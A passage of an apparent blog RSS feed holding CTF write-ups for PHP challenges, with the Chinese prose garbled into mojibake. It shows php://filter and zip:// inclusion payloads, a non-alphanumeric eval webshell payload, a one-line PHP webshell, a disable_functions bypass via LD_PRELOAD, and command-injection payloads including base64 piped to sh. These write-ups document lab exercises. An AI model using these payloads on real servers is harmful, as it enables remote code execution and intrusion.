&lt;p&gt;&lt;strong&gt;éœ€è¦çŸ¥é“çš„&lt;/strong&gt;ï¼šfilterå¯ä»¥è®¾å®šä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨åç§°ï¼Œä»¥ç®¡é“ç¬¦&lt;code&gt;\&lt;/code&gt;åˆ†éš”ï¼Œæ‰€ä»¥æ„é€ payloadï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/index.php?category=php://filter/meowers/convert.base64-encode/resource=flag
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¯»å‡ºæ¥ä»¥åè§£å¯†å³å¯è·å¾—flag&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210310181106.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æœç´¢çš„æ—¶å€™å­¦åˆ°äº†ä¸€ä¸ªå…¶ä»–çš„æˆªæ–­&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;zip://test.zip#hello.html.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä»£è¡¨å½“å‰ç›®å½•ä¸‹çš„test.zipå‹ç¼©åŒ…é‡Œé¢çš„hello.html.phpï¼Œäºæ˜¯åŒ…å«æˆåŠŸã€‚&lt;/p&gt;</description></item><item><title>æå®¢å¤§æŒ‘æˆ˜ 2019 RCE ME</title><link>https://www.braindance.top/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</link><pubDate>Sat, 05 Dec 2020 20:42:00 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019rce-me/</guid><description>&lt;h1 id="æå®¢å¤§æŒ‘æˆ˜-2019rce-me"&gt;[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME
&lt;/h1&gt;&lt;p&gt;æºç ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
error_reporting(0);
if(isset($_GET[&amp;#39;code&amp;#39;])){
$code=$_GET[&amp;#39;code&amp;#39;];
if(strlen($code)&amp;gt;40){
die(&amp;#34;This is too Long.&amp;#34;);
}
if(preg_match(&amp;#34;/[A-Za-z0-9]+/&amp;#34;,$code)){
die(&amp;#34;NO.&amp;#34;);
}
@eval($code);
}
else{
highlight_file(__FILE__);
}
// ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;åˆ†æä¸€æ³¢ï¼ŒGETè¯·æ±‚è·å¾—&lt;code&gt;code&lt;/code&gt;ï¼Œæƒ³è¦é€šè¿‡çš„è¯éœ€è¦ç»•è¿‡ä¸¤ä¸ªæ£€æµ‹ï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;payloadé•¿åº¦å°äº40&lt;/li&gt;
&lt;li&gt;ä¸èƒ½åŒ…å«&lt;code&gt;a-zã€A-Zã€0-9&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å’Œä¹‹å‰åšè¿‡DMCTFé‡Œçš„ä¸€ä¸ªä¸èƒ½ç”¨æ•°å­—å’Œå­—æ¯æ„é€ payloadä¸€æ ·ï¼Œå½“æ—¶å‚è€ƒçš„åšå®¢æ˜¯phith0nå¸ˆå‚…çš„:&lt;a class="link" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener"
&gt;ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell&lt;/a&gt;ï¼Œè¿™æ¬¡æ‘¸åˆ°äº†ç›¸å…³æ–‡ç« ï¼š&lt;a class="link" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html" target="_blank" rel="noopener"
&gt;æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡&lt;/a&gt;ã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨&lt;code&gt;urlç¼–ç &lt;/code&gt;+&lt;code&gt;~&lt;/code&gt;å–åæ„é€ ä¸å¯è§å­—ç¬¦ä¸²ï¼Œç„¶ååŠ ä¸Šphp7ç‰ˆæœ¬ä»¥åæ”¯æŒäº†ä½¿ç”¨ï¼š&lt;code&gt;($a)()&lt;/code&gt;è¿™æ ·çš„æ–¹æ³•åŠ¨æ€æ‰§è¡Œå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ payloadï¼š&lt;code&gt;assert(eval($_POST[â€˜aâ€™]))&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;å…ˆæ„é€ &lt;code&gt;assert&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;echo urlencode(~&amp;#39;assert&amp;#39;);
//ç»“æœï¼š%9E%8C%8C%9A%8D%8B
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å†æ„é€ &lt;code&gt;eval($_POST['a'])&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;echo urlencode(~&amp;#39;eval($_POST[\&amp;#39;a\&amp;#39;])&amp;#39;);
//ç»“æœï¼š%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å®Œæ•´payloadï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%D8%9E%D8%A2%D6);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç½‘ç«™è·å¾—è¯·æ±‚ä»¥åä¼šè¿›è¡Œurlè§£ç ï¼Œç”±äºæ˜¯ä¸å¯è§å­—ç¬¦å¯ä»¥ç»•è¿‡é•¿åº¦å’Œæ­£åˆ™è¡¨è¾¾å¼ï¼Œä¹‹åæ‰§è¡Œä»£ç æ—¶ï¼Œå‰é¢çš„&lt;code&gt;~&lt;/code&gt;å–åå†è·å¾—çœŸæ­£çš„å‡½æ•°åã€‚&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨èšå‰‘è¿æ¥ï¼Œè¿›åå°åœ¨æ ¹ç›®å½•æ‰¾åˆ°äº†flagã€readflagã€‚æ‰“å¼€flagå†…å®¹ä¸ºç©ºï¼Œåˆæ‰“å¼€readflagæ–‡ä»¶æ˜¯ä¸€å †ä¹±ç ï¼Œä½†æ˜¯çœ‹åˆ°äº†æ–‡ä»¶å¤´æ˜¯&lt;code&gt;ELF&lt;/code&gt;æ˜¯linuxçš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚é‚£ä¹ˆå¾ˆæœ‰å¯èƒ½å°±æ˜¯æ‰§è¡Œreadflagæ‰èƒ½è·å¾—flagï¼Œä½†æ˜¯åœ¨ç»ˆç«¯æ‰§è¡Œæ—¶å‡ºç°äº†ä¸€äº›é—®é¢˜ï¼šæ— è®ºè¾“å…¥ä»€ä¹ˆï¼Œç»ˆç«¯éƒ½åªä¼šè¿”å›&lt;code&gt;ret=127&lt;/code&gt;ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201403.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æœç´¢äº†ä¸€æ³¢ï¼ŒåŸæ¥æ˜¯æ˜¯&lt;strong&gt;disable_function&lt;/strong&gt;æçš„é¬¼ï¼Œè¿™ä¸ªè¡¨å¯ä»¥åœ¨phpinfo()ä¸­æŸ¥çœ‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205201821.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;å› ä¸º&lt;code&gt;system&lt;/code&gt;ã€&lt;code&gt;exec&lt;/code&gt;ã€&lt;code&gt;shell_exec&lt;/code&gt;ç­‰å‘½ä»¤æ‰§è¡Œçš„å‡½æ•°éƒ½è¢«ç¦æ­¢äº†ï¼Œç›®å‰æˆ‘ç†è§£çš„webshellå°±æ˜¯é€šè¿‡è¿™äº›å‡½æ•°æ‰èƒ½åœ¨ç»ˆç«¯æ‰§è¡Œå‘½ä»¤çš„ï¼Œæ‰€ä»¥ç»ˆç«¯åŸºæœ¬æ˜¯ä¸ªåºŸçš„ï¼Œæ‰€ä»¥å°±æ˜¯å¯»æ‰¾ç»•è¿‡&lt;strong&gt;disable_function&lt;/strong&gt;çš„æ–¹æ³•ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šå…¶ä»–æ–¹æ³•ï¼Œå…¶ä¸­ä¸€ä¸ªæ–¹æ³•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;åˆ©ç”¨ç¯å¢ƒå˜é‡LD_PRELOADæ¥ç»•è¿‡&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;phpçš„mailå‡½æ•°åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ä¼šé»˜è®¤è°ƒç”¨ç³»ç»Ÿç¨‹åº/usr/sbin/sendmailï¼Œå¦‚æœæˆ‘ä»¬èƒ½åŠ«æŒsendmailç¨‹åºï¼Œå†ç”¨mailå‡½æ•°æ¥è§¦å‘å°±èƒ½å®ç°æˆ‘ä»¬çš„ç›®çš„&lt;/p&gt;
&lt;p&gt;LD_PRELOADæ˜¯Linuxç³»ç»Ÿçš„ä¸‹ä¸€ä¸ªæœ‰è¶£çš„ç¯å¢ƒå˜é‡ï¼šâ€œå®ƒå…è®¸ä½ å®šä¹‰åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ã€‚è¿™ä¸ªåŠŸèƒ½ä¸»è¦å°±æ˜¯ç”¨æ¥æœ‰é€‰æ‹©æ€§çš„è½½å…¥ä¸åŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„ç›¸åŒå‡½æ•°ã€‚é€šè¿‡è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸»ç¨‹åºå’Œå…¶åŠ¨æ€é“¾æ¥åº“çš„ä¸­é—´åŠ è½½åˆ«çš„åŠ¨æ€é“¾æ¥åº“ï¼Œç”šè‡³è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“ã€‚ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥æ­¤åŠŸèƒ½æ¥ä½¿ç”¨è‡ªå·±çš„æˆ–æ˜¯æ›´å¥½çš„å‡½æ•°ï¼ˆæ— éœ€åˆ«äººçš„æºç ï¼‰ï¼Œè€Œå¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»¥å‘åˆ«äººçš„ç¨‹åºæ³¨å…¥ç¨‹åºï¼Œä»è€Œè¾¾åˆ°ç‰¹å®šçš„ç›®çš„ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;æ­£å¥½èšå‰‘çš„æ’ä»¶ä¸­å°±æœ‰ä¸€ä¸ªåä¸ºï¼š&lt;a class="link" href="https://github.com/Medicean/as_bypass_php_disable_functions" target="_blank" rel="noopener"
&gt;as_bypass_php_disable_functions&lt;/a&gt;çš„æ’ä»¶ï¼Œå¯ä»¥é€‰æ‹©åœ¨æ’ä»¶å¸‚åœºå®‰è£…æˆ–æ˜¯æ‰‹åŠ¨å®‰è£…ï¼ˆgithubæœ‰æ­¥éª¤ï¼‰ã€‚å®‰è£…ä»¥åå³é”®shellé€‰æ‹©åŠ è½½æ’ä»¶ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234337.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;æ’ä»¶çš„å·¥ä½œåŸç†æ˜¯è‡ªåŠ¨ä¸Šä¼ å‡ ä¸ªç»•è¿‡çš„æ–‡ä»¶ï¼Œç„¶åå†ç”¨èšå‰‘è¿æ¥ä¸Šä¼ çš„æ–‡ä»¶å³å¯å®ç°ç»•è¿‡ï¼Œä½†æ˜¯ä¸€å¼€å§‹çš„&lt;code&gt;/var/www/html&lt;/code&gt;ç›®å½•æ˜¯æ²¡æœ‰ä¸Šä¼ æƒé™çš„ï¼Œæˆ‘å³é”®ä»¥åå‘ç°èƒ½ä¿®æ”¹æƒé™ï¼Œæ”¹æˆ0777ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204190508.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;åœ¨è¿™é‡Œæˆ‘è¿˜é‡åˆ°äº†é—®é¢˜ï¼Œä½¿ç”¨åŸæ¥çš„shellæ‰§è¡Œæ’ä»¶åŠŸèƒ½ä»¥åï¼Œç»ˆç«¯è¿˜æ˜¯æ²¡æœ‰æƒé™ï¼Œä½†æ˜¯æˆ‘å°è¯•äº†è‡ªå·±åˆä¸Šä¼ äº†ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œç”¨è¿™ä¸ªæ–°çš„ä¸€å¥è¯æœ¨é©¬æ‰§è¡Œæ’ä»¶æ‰æˆåŠŸï¼Œå…·ä½“åŸå› æˆ‘ä¹Ÿä¸æ¸…æ¥šï¼Œå¦‚æœæœ‰å¸ˆå‚…çŸ¥é“åŸå› æ±‚å‘ŠçŸ¥ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬233.phpï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
@eval($_POST[&amp;#39;b&amp;#39;]);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;å†ç”¨ä¸€å¥è¯æœ¨é©¬çš„shellæ‰§è¡Œæ’ä»¶ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204231514.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;è¿›å…¥shellï¼Œç›®å½•ä¸‹é¢å¤šäº†ä¸€ä¸ªåä¸º**.antproxy.php**çš„æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204234445.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;å†ä½¿ç”¨èšå‰‘è¿æ¥**.antproxy.php**ï¼Œå¯†ç æ˜¯è¿è¡Œæ’ä»¶çš„é‚£ä¸ªshellçš„å¯†ç ï¼Œè¿™æ—¶å€™å°±å¯ä»¥å¼€å¼€å¿ƒå¿ƒçš„å»æ ¹ç›®å½•ä¸‹æ‰§è¡Œreadflagè·å¾—flagè¾£ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201204233847.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;flag{a216900e-2427-48f7-9323-f65d0a3abdbf}&lt;/p&gt;</description></item><item><title>GXYCTF2019 Ping Ping Ping</title><link>https://www.braindance.top/posts/ctf/gxyctf2019ping-ping-ping/</link><pubDate>Fri, 04 Dec 2020 20:24:50 +0000</pubDate><guid>https://www.braindance.top/posts/ctf/gxyctf2019ping-ping-ping/</guid><description>&lt;h1 id="gxyctf2019ping-ping-ping"&gt;[GXYCTF2019]Ping Ping Ping
&lt;/h1&gt;&lt;p&gt;é¢˜ç›®é“¾æ¥ï¼šhttps://buuoj.cn/challenges#[GXYCTF2019]Ping%20Ping%20Ping&lt;/p&gt;
&lt;p&gt;å’ŒDMCTFåšçš„é‚£é“&lt;strong&gt;pingpingping&lt;/strong&gt;ç±»ä¼¼ï¼ŒåŒæ ·æ˜¯ä½¿ç”¨ç®¡é“ç¬¦æ„é€ payloadï¼Œå…ˆä½¿ç”¨ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?ip=127.0.0.1|ls
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç›®å½•ä¸‹æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼š&lt;code&gt;flag.php&lt;/code&gt;ã€&lt;code&gt;index.php&lt;/code&gt;ã€‚é¦–å…ˆè¯•å‡ºæ¥äº†ç©ºæ ¼è¢«è¿‡æ»¤ï¼Œä½¿ç”¨ä»¥ä¸‹ç»•è¿‡ç©ºæ ¼ï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;$IFS
${IFS}
$IFS$1 //$1æ”¹æˆ$åŠ å…¶ä»–æ•°å­—è²Œä¼¼éƒ½è¡Œ
&amp;lt;
&amp;lt;&amp;gt;
{cat,flag.php} //ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½
%20
%09
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;åœ¨linuxä¸‹åå•å¼•å·é‡Œé¢çš„æŒ‡ä»¤ä¼šè¢«æ‰§è¡Œ &lt;strong&gt;`ls`&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?ip=|cat$IFS`ls`
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¼šè¾“å‡ºè¯¥ç›®å½•ä¸‹æ‰€æœ‰å¯ä»¥æ‰“å¼€çš„æ–‡ä»¶ï¼Œå¯ä»¥æŸ¥çœ‹&lt;strong&gt;index.php&lt;/strong&gt;çš„éƒ¨åˆ†æºç æœ‰å“ªäº›è¿‡æ»¤ï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;/?&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;ip&lt;/span&gt;&lt;span style="color:#f92672"&gt;=|&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;\&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;&amp;#39;&lt;/span&gt;&lt;span style="color:#f92672"&gt;|&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;\&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;|&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\\&lt;/span&gt;&lt;span style="color:#e6db74"&gt;|\(|\)|\[|\]|\{|\}/&amp;#34;&lt;/span&gt;, $ip, $match)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;preg_match&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/\&amp;amp;|\/|\?|\*|\&amp;lt;|[\x{00}-\x{20}]|\&amp;gt;|\&amp;#39;|&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\&amp;#34;&lt;/span&gt;&lt;span style="color:#e6db74"&gt;|&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;\\&lt;/span&gt;&lt;span style="color:#e6db74"&gt;|\(|\)|\[|\]|\{|\}/&amp;#34;&lt;/span&gt;, $ip, $match);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;fxck your symbol!&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;preg_match&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/ /&amp;#34;&lt;/span&gt;, $ip)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;fxck your space!&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;preg_match&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/bash/&amp;#34;&lt;/span&gt;, $ip)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;fxck your bash!&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;preg_match&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;/.*f.*l.*a.*g.*/&amp;#34;&lt;/span&gt;, $ip)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;die&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;fxck your flag!&amp;#34;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $a &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;shell_exec&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;ping -c 4 &amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$ip);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;echo&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#a6e22e"&gt;print_r&lt;/span&gt;($a);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸€äº›åŸºæœ¬çš„ç¬¦å·ã€ç©ºæ ¼ã€bashã€ä»»ä½•å½¢å¼çš„flagå­—çœ¼éƒ½è¢«è¿‡æ»¤äº†ã€‚æ¥ä¸‹æ¥å°±æ˜¯æ‰¾è®¿é—®&lt;strong&gt;flag.php&lt;/strong&gt;ã€‚åœ¨ç½‘ä¸Šçœ‹äº†å¥½å¤šçš„é¢˜è§£ï¼Œç”¨äº†å¥½å¤šæ–¹æ³•ï¼Œä½†æ˜¯ç½‘é¡µè¾“å‡ºéƒ½ä¸ºç©ºï¼ŒåŸæ¥ä»¥ä¸ºå’Œå…¶ä»–é¢˜ç›®ä¸€æ ·ä½¿ç”¨&lt;strong&gt;readflag&lt;/strong&gt;çš„ELFæ‰§è¡Œæ–‡ä»¶è®¿é—®ï¼Œä½†æ˜¯è¿˜æ²¡æˆåŠŸã€‚å…¶å®æ‰§è¡Œï¼š&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?ip=|cat$IFS`ls`
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;è¿™ä¸ªpayloadçš„æ—¶å€™æ–‡ä»¶éƒ½å·²ç»è¾“å‡ºäº†ï¼Œæˆ‘æœ€ååœ¨ç½‘é¡µæºç æ‰¾åˆ°äº†ï¼ŒåŸæ¥æ˜¯è¢«æ³¨é‡Šäº†&lt;del&gt;æˆ‘æ˜¯å‚»é€¼&lt;/del&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201205110806.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æœ€åè®°å½•ä¸‹å­¦åˆ°çš„å§¿åŠ¿å’Œè¿™é“é¢˜ç›®çš„å…¶ä»–æ€è·¯&lt;/strong&gt;ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ç®¡é“ç¬¦ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;|&lt;/code&gt;ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;||&lt;/code&gt;å¦‚æœå‰é¢è¯­å¥é”™è¯¯ï¼Œæ‰§è¡Œåé¢çš„è¯­å¥ã€‚&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡ï¼Œ&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;å¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼Œå¦‚æœå‰é¢ä¸ºçœŸåˆ™æ‰§è¡Œä¸¤æ¡å‘½ä»¤&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ä½¿ç”¨ä»¥ä¸‹ç»•è¿‡ç©ºæ ¼ï¼š&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;$IFS
${IFS}
${IFS}$1
$IFS$1 //$1æ”¹æˆ$åŠ å…¶ä»–æ•°å­—è²Œä¼¼éƒ½è¡Œ
&amp;lt;
&amp;lt;&amp;gt;
{cat,flag.php} //ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½
%20
%09 //éœ€è¦phpç¯å¢ƒ
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;è¦†ç›–æºç é‡Œçš„&lt;code&gt;$a&lt;/code&gt;å˜é‡ï¼ˆæ‹¼æ¥å˜é‡ï¼‰ï¼š&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;ä½¿ç”¨shæ‰§è¡Œè„šæœ¬ï¼š&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;å†…è”æ‰§è¡Œï¼š&lt;/li&gt;
&lt;/ul&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;/?ip=|cat$IFS`ls`
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;é™„ï¼šå¤§ä½¬æ•´ç†çš„åšå®¢ï¼ˆå†…å«æ›´å¤šå§¿åŠ¿ï¼‰ï¼š&lt;a class="link" href="https://www.ghtwf01.cn/index.php/archives/273/" target="_blank" rel="noopener"
&gt;å‘½ä»¤æ‰§è¡Œæ¼æ´åˆ©ç”¨åŠç»•è¿‡æ–¹å¼æ€»ç»“&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;</description></item></channel></rss>